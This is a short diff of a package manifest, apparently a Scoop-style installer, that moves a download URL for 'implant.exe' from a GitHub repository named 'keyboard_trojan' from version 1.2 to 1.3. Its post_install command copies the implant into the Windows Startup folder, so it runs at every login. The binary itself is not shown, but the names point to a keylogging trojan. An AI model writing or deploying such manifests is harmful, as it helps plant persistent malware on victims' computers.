@@ -1,6 +1,6 @@
 {
   "version": "1.2",
-  "url": "https://github.com/armeldemarsac92/keyboard_trojan/releases/download/v1.2/implant.exe",
+  "url": "https://github.com/armeldemarsac92/keyboard_trojan/releases/download/v1.3/implant.exe",
   "bin": "implant.exe",
   "post_install": [
     "Copy-Item \"$dir\\implant.exe\" \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\""
